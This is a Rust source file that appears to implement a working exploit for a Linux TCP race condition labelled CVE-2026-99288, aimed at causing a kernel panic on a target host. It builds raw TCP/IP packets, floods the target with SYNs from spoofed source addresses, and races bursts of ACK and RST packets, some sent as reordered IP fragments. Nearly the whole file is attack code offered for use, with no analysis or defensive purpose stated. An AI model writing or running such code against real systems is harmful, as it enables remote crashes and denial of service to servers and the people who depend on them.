#[cfg(target_os = "linux")]
mod platform {
    use std::io;
    use std::mem;
    use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
    use std::os::fd::RawFd;
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::sync::Arc;
    use std::thread;
    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

    const RACE_BURST: usize = 32;
    const PRESSURE_WORKERS: usize = 4;
    const COOKIE_TIMEOUT: Duration = Duration::from_millis(100);
    const RETRY_DELAY: Duration = Duration::from_millis(1);
    const FIRST_FRAGMENT_LEN: usize = 8;
    const FLAG_SYN: u8 = 0x02;
    const FLAG_RST: u8 = 0x04;
    const FLAG_ACK: u8 = 0x10;

    #[derive(Default)]
    struct Stats {
        packets: AtomicU64,
        syn: AtomicU64,
        pressure_syn: AtomicU64,
        cookies: AtomicU64,
        ack: AtomicU64,
        rst: AtomicU64,
        fragments: AtomicU64,
        timeouts: AtomicU64,
        failures: AtomicU64,
    }

    struct RawSocket {
        fd: RawFd,
    }

    unsafe impl Send for RawSocket {}
    unsafe impl Sync for RawSocket {}

    impl RawSocket {
        fn open(protocol: i32) -> io::Result<Self> {
            let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, protocol) };
            if fd < 0 {
                return Err(raw_socket_error());
            }
            Ok(Self { fd })
        }

        fn sender() -> io::Result<Self> {
            let socket = Self::open(libc::IPPROTO_RAW)?;
            let enabled: i32 = 1;
            let result = unsafe {
                libc::setsockopt(
                    socket.fd,
                    libc::IPPROTO_IP,
                    libc::IP_HDRINCL,
                    &enabled as *const i32 as *const libc::c_void,
                    mem::size_of_val(&enabled) as libc::socklen_t,
                )
            };
            if result < 0 {
                return Err(io::Error::last_os_error());
            }
            Ok(socket)
        }

        fn receiver(source: Ipv4Addr) -> io::Result<Self> {
            let socket = Self::open(libc::IPPROTO_TCP)?;
            let address = socket_address(source);
            let result = unsafe {
                libc::bind(
                    socket.fd,
                    &address as *const libc::sockaddr_in as *const libc::sockaddr,
                    mem::size_of_val(&address) as libc::socklen_t,
                )
            };
            if result < 0 {
                return Err(io::Error::last_os_error());
            }
            Ok(socket)
        }

        fn send(&self, packet: &[u8], target: Ipv4Addr) -> io::Result<()> {
            let address = socket_address(target);
            let sent = unsafe {
                libc::sendto(
                    self.fd,
                    packet.as_ptr() as *const libc::c_void,
                    packet.len(),
                    0,
                    &address as *const libc::sockaddr_in as *const libc::sockaddr,
                    mem::size_of_val(&address) as libc::socklen_t,
                )
            };
            if sent < 0 {
                Err(io::Error::last_os_error())
            } else if sent as usize == packet.len() {
                Ok(())
            } else {
                Err(io::Error::new(
                    io::ErrorKind::WriteZero,
                    "raw socket sent a partial packet",
                ))
            }
        }

        fn receive(&self, buffer: &mut [u8]) -> io::Result<usize> {
            let received = unsafe {
                libc::recv(
                    self.fd,
                    buffer.as_mut_ptr() as *mut libc::c_void,
                    buffer.len(),
                    0,
                )
            };
            if received < 0 {
                Err(io::Error::last_os_error())
            } else {
                Ok(received as usize)
            }
        }
    }

    impl Drop for RawSocket {
        fn drop(&mut self) {
            unsafe {
                libc::close(self.fd);
            }
        }
    }

    pub fn run(
        target: Ipv4Addr,
        port: u16,
        workers: usize,
        first_source_port: u16,
    ) -> io::Result<()> {
        let source = local_address(target, port)?;
        let sender = Arc::new(RawSocket::sender()?);
        let receiver = Arc::new(RawSocket::receiver(source)?);
        let stats = Arc::new(Stats::default());
        let packet_ids = Arc::new(AtomicU64::new(1));
        let cookies = Arc::new((0..workers).map(|_| AtomicU64::new(0)).collect::<Vec<_>>());

        println!(
            "mode=cve-2026-99288 target={target}:{port} source={source} workers={workers} source_ports={}-{}",
            first_source_port,
            first_source_port as usize + workers - 1
        );
        println!("Ctrl+C to stop; packet statistics do not confirm a kernel panic");

        thread::scope(|scope| {
            {
                let receiver = Arc::clone(&receiver);
                let cookies = Arc::clone(&cookies);
                let stats = Arc::clone(&stats);
                scope.spawn(move || {
                    receive_cookies(
                        receiver,
                        target,
                        port,
                        source,
                        first_source_port,
                        cookies,
                        stats,
                    )
                });
            }

            for pressure_id in 0..PRESSURE_WORKERS {
                let sender = Arc::clone(&sender);
                let stats = Arc::clone(&stats);
                let packet_ids = Arc::clone(&packet_ids);
                scope.spawn(move || {
                    queue_pressure(
                        sender,
                        source,
                        target,
                        port,
                        first_source_port,
                        workers,
                        pressure_id,
                        packet_ids,
                        stats,
                    )
                });
            }

            for worker in 0..workers {
                let sender = Arc::clone(&sender);
                let cookies = Arc::clone(&cookies);
                let stats = Arc::clone(&stats);
                let packet_ids = Arc::clone(&packet_ids);
                let source_port = first_source_port as usize + worker;
                scope.spawn(move || {
                    race_worker(
                        sender,
                        source,
                        target,
                        source_port as u16,
                        port,
                        &cookies[worker],
                        packet_ids,
                        stats,
                    )
                });
            }

            scope.spawn(move || report(stats));
        });
        Ok(())
    }

    fn local_address(target: Ipv4Addr, port: u16) -> io::Result<Ipv4Addr> {
        let socket = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0))?;
        socket.connect(SocketAddr::from((target, port)))?;
        match socket.local_addr()?.ip() {
            std::net::IpAddr::V4(address) => Ok(address),
            std::net::IpAddr::V6(_) => Err(io::Error::new(
                io::ErrorKind::AddrNotAvailable,
                "an IPv4 source address is required",
            )),
        }
    }

    fn raw_socket_error() -> io::Error {
        let error = io::Error::last_os_error();
        io::Error::new(
            error.kind(),
            format!("{error}; raw sockets require root or CAP_NET_RAW"),
        )
    }

    fn socket_address(address: Ipv4Addr) -> libc::sockaddr_in {
        libc::sockaddr_in {
            sin_family: libc::AF_INET as libc::sa_family_t,
            sin_port: 0,
            sin_addr: libc::in_addr {
                s_addr: u32::from_ne_bytes(address.octets()),
            },
            sin_zero: [0; 8],
        }
    }

    fn receive_cookies(
        receiver: Arc<RawSocket>,
        target: Ipv4Addr,
        target_port: u16,
        source: Ipv4Addr,
        first_source_port: u16,
        cookies: Arc<Vec<AtomicU64>>,
        stats: Arc<Stats>,
    ) {
        let mut buffer = [0u8; 65_535];
        loop {
            match receiver.receive(&mut buffer) {
                Ok(length) => {
                    if let Some((port, sequence)) =
                        parse_syn_ack(&buffer[..length], source, target, target_port)
                    {
                        let offset = usize::from(port.wrapping_sub(first_source_port));
                        if port >= first_source_port && offset < cookies.len() {
                            cookies[offset]
                                .store((u64::from(sequence) << 1) | 1, Ordering::Release);
                            stats.cookies.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
                Err(error) if error.kind() == io::ErrorKind::Interrupted => continue,
                Err(_) => {
                    stats.failures.fetch_add(1, Ordering::Relaxed);
                    thread::sleep(RETRY_DELAY);
                }
            }
        }
    }

    fn parse_syn_ack(
        packet: &[u8],
        source: Ipv4Addr,
        target: Ipv4Addr,
        target_port: u16,
    ) -> Option<(u16, u32)> {
        if packet.len() < 40 || packet[0] >> 4 != 4 || packet[9] != libc::IPPROTO_TCP as u8 {
            return None;
        }
        let ip_header = usize::from(packet[0] & 0x0f) * 4;
        if ip_header < 20 || packet.len() < ip_header + 20 {
            return None;
        }
        if packet[12..16] != target.octets() || packet[16..20] != source.octets() {
            return None;
        }
        let tcp = &packet[ip_header..];
        let source_port = u16::from_be_bytes([tcp[0], tcp[1]]);
        let destination_port = u16::from_be_bytes([tcp[2], tcp[3]]);
        if source_port != target_port || tcp[13] & (FLAG_SYN | FLAG_ACK) != FLAG_SYN | FLAG_ACK {
            return None;
        }
        Some((
            destination_port,
            u32::from_be_bytes([tcp[4], tcp[5], tcp[6], tcp[7]]),
        ))
    }

    fn queue_pressure(
        sender: Arc<RawSocket>,
        source: Ipv4Addr,
        target: Ipv4Addr,
        target_port: u16,
        first_race_port: u16,
        race_workers: usize,
        pressure_id: usize,
        packet_ids: Arc<AtomicU64>,
        stats: Arc<Stats>,
    ) {
        let octets = source.octets();
        let pressure_source = Ipv4Addr::new(
            octets[0],
            octets[1],
            octets[2],
            ((usize::from(octets[3]) + 63 + pressure_id * 32) % 250 + 1) as u8,
        );
        let race_start = usize::from(first_race_port);
        let race_end = race_start + race_workers;
        let mut source_port = 1024 + pressure_id;
        let mut sequence = 0x51f1_5eedu32 ^ pressure_id as u32;
        loop {
            if source_port >= 65_536 {
                source_port = 1024 + pressure_id;
                thread::yield_now();
            }
            if source_port >= race_start && source_port < race_end {
                source_port += PRESSURE_WORKERS;
                continue;
            }
            sequence = sequence.wrapping_add(source_port as u32).rotate_left(7);
            if send_tcp(
                &sender,
                pressure_source,
                target,
                source_port as u16,
                target_port,
                sequence,
                0,
                FLAG_SYN,
                false,
                &packet_ids,
                &stats,
            ) {
                stats.pressure_syn.fetch_add(1, Ordering::Relaxed);
            } else {
                thread::sleep(RETRY_DELAY);
            }
            source_port += PRESSURE_WORKERS;
        }
    }

    fn race_worker(
        sender: Arc<RawSocket>,
        source: Ipv4Addr,
        target: Ipv4Addr,
        source_port: u16,
        target_port: u16,
        cookie: &AtomicU64,
        packet_ids: Arc<AtomicU64>,
        stats: Arc<Stats>,
    ) {
        let mut round = 0u32;
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos()
            ^ u32::from(source_port);
        loop {
            round = round.wrapping_add(1);
            let client_sequence = seed.wrapping_add(round.wrapping_mul(0x9e37_79b9));
            cookie.store(0, Ordering::Release);
            if send_tcp(
                &sender,
                source,
                target,
                source_port,
                target_port,
                client_sequence,
                0,
                FLAG_SYN,
                false,
                &packet_ids,
                &stats,
            ) {
                stats.syn.fetch_add(1, Ordering::Relaxed);
            } else {
                thread::sleep(RETRY_DELAY);
                continue;
            }

            let started = Instant::now();
            let server_sequence = loop {
                let value = cookie.load(Ordering::Acquire);
                if value != 0 {
                    break Some((value >> 1) as u32);
                }
                if started.elapsed() >= COOKIE_TIMEOUT {
                    stats.timeouts.fetch_add(1, Ordering::Relaxed);
                    break None;
                }
                thread::sleep(Duration::from_micros(100));
            };
            let Some(server_sequence) = server_sequence else {
                continue;
            };

            let acknowledgment = server_sequence.wrapping_add(1);
            thread::scope(|scope| {
                let sender = &sender;
                let stats = &stats;
                let packet_ids = &packet_ids;
                scope.spawn(move || {
                    for _ in 0..RACE_BURST {
                        if send_tcp(
                            sender,
                            source,
                            target,
                            source_port,
                            target_port,
                            client_sequence.wrapping_add(1),
                            acknowledgment,
                            FLAG_ACK,
                            false,
                            packet_ids,
                            stats,
                        ) {
                            stats.ack.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                });
                scope.spawn(move || {
                    for _ in 0..RACE_BURST {
                        if send_tcp(
                            sender,
                            source,
                            target,
                            source_port,
                            target_port,
                            client_sequence.wrapping_add(1),
                            acknowledgment,
                            FLAG_RST | FLAG_ACK,
                            true,
                            packet_ids,
                            stats,
                        ) {
                            stats.rst.fetch_add(1, Ordering::Relaxed);
                        }
                        if send_tcp(
                            sender,
                            source,
                            target,
                            source_port,
                            target_port,
                            client_sequence.wrapping_add(1),
                            acknowledgment,
                            FLAG_ACK,
                            true,
                            packet_ids,
                            stats,
                        ) {
                            stats.ack.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                });
            });
        }
    }

    fn send_tcp(
        socket: &RawSocket,
        source: Ipv4Addr,
        target: Ipv4Addr,
        source_port: u16,
        target_port: u16,
        sequence: u32,
        acknowledgment: u32,
        flags: u8,
        fragmented: bool,
        packet_ids: &AtomicU64,
        stats: &Stats,
    ) -> bool {
        let tcp = tcp_packet(
            source,
            target,
            source_port,
            target_port,
            sequence,
            acknowledgment,
            flags,
        );
        let id = packet_ids.fetch_add(1, Ordering::Relaxed) as u16;
        if fragmented {
            let second = ipv4_packet(
                source,
                target,
                id,
                (FIRST_FRAGMENT_LEN / 8) as u16,
                &tcp[FIRST_FRAGMENT_LEN..],
            );
            let first = ipv4_packet(source, target, id, 0x2000, &tcp[..FIRST_FRAGMENT_LEN]);
            let second_sent = transmit(socket, &second, target, stats);
            let first_sent = transmit(socket, &first, target, stats);
            stats.fragments.fetch_add(2, Ordering::Relaxed);
            second_sent && first_sent
        } else {
            let packet = ipv4_packet(source, target, id, 0, &tcp);
            transmit(socket, &packet, target, stats)
        }
    }

    fn transmit(socket: &RawSocket, packet: &[u8], target: Ipv4Addr, stats: &Stats) -> bool {
        match socket.send(packet, target) {
            Ok(()) => {
                stats.packets.fetch_add(1, Ordering::Relaxed);
                true
            }
            Err(_) => {
                stats.failures.fetch_add(1, Ordering::Relaxed);
                false
            }
        }
    }

    fn tcp_packet(
        source: Ipv4Addr,
        target: Ipv4Addr,
        source_port: u16,
        target_port: u16,
        sequence: u32,
        acknowledgment: u32,
        flags: u8,
    ) -> [u8; 20] {
        let mut tcp = [0u8; 20];
        tcp[0..2].copy_from_slice(&source_port.to_be_bytes());
        tcp[2..4].copy_from_slice(&target_port.to_be_bytes());
        tcp[4..8].copy_from_slice(&sequence.to_be_bytes());
        tcp[8..12].copy_from_slice(&acknowledgment.to_be_bytes());
        tcp[12] = 5 << 4;
        tcp[13] = flags;
        tcp[14..16].copy_from_slice(&64_240u16.to_be_bytes());
        let sum = pseudo_header_sum(source, target, tcp.len()) + checksum_sum(&tcp);
        tcp[16..18].copy_from_slice(&finish_checksum(sum).to_be_bytes());
        tcp
    }

    fn ipv4_packet(
        source: Ipv4Addr,
        target: Ipv4Addr,
        id: u16,
        fragment: u16,
        payload: &[u8],
    ) -> Vec<u8> {
        let mut packet = vec![0u8; 20 + payload.len()];
        let total_length = packet.len() as u16;
        packet[0] = 0x45;
        packet[2..4].copy_from_slice(&total_length.to_be_bytes());
        packet[4..6].copy_from_slice(&id.to_be_bytes());
        packet[6..8].copy_from_slice(&fragment.to_be_bytes());
        packet[8] = 64;
        packet[9] = libc::IPPROTO_TCP as u8;
        packet[12..16].copy_from_slice(&source.octets());
        packet[16..20].copy_from_slice(&target.octets());
        packet[20..].copy_from_slice(payload);
        let checksum = finish_checksum(checksum_sum(&packet[..20]));
        packet[10..12].copy_from_slice(&checksum.to_be_bytes());
        packet
    }

    fn pseudo_header_sum(source: Ipv4Addr, target: Ipv4Addr, tcp_length: usize) -> u32 {
        checksum_sum(&source.octets())
            + checksum_sum(&target.octets())
            + u32::from(libc::IPPROTO_TCP as u16)
            + tcp_length as u32
    }

    fn checksum_sum(bytes: &[u8]) -> u32 {
        let mut sum = 0u32;
        let (chunks, remainder) = bytes.as_chunks::<2>();
        for chunk in chunks {
            sum += u32::from(u16::from_be_bytes(*chunk));
        }
        if let Some(last) = remainder.first() {
            sum += u32::from(*last) << 8;
        }
        sum
    }

    fn finish_checksum(mut sum: u32) -> u16 {
        while sum >> 16 != 0 {
            sum = (sum & 0xffff) + (sum >> 16);
        }
        !(sum as u16)
    }

    fn report(stats: Arc<Stats>) {
        let started = Instant::now();
        loop {
            thread::sleep(Duration::from_secs(5));
            println!(
                "[{:6}s] packets={} syn={} pressure_syn={} cookies={} ack={} rst={} fragments={} timeouts={} failures={}",
                started.elapsed().as_secs(),
                stats.packets.load(Ordering::Relaxed),
                stats.syn.load(Ordering::Relaxed),
                stats.pressure_syn.load(Ordering::Relaxed),
                stats.cookies.load(Ordering::Relaxed),
                stats.ack.load(Ordering::Relaxed),
                stats.rst.load(Ordering::Relaxed),
                stats.fragments.load(Ordering::Relaxed),
                stats.timeouts.load(Ordering::Relaxed),
                stats.failures.load(Ordering::Relaxed),
            );
        }
    }
}

#[cfg(target_os = "linux")]
pub use platform::run;

#[cfg(not(target_os = "linux"))]
pub fn run(
    _target: std::net::Ipv4Addr,
    _port: u16,
    _workers: usize,
    _first_source_port: u16,
) -> std::io::Result<()> {
    Err(std::io::Error::new(
        std::io::ErrorKind::Unsupported,
        "CVE-2026-99288 mode requires Linux raw sockets",
    ))
}
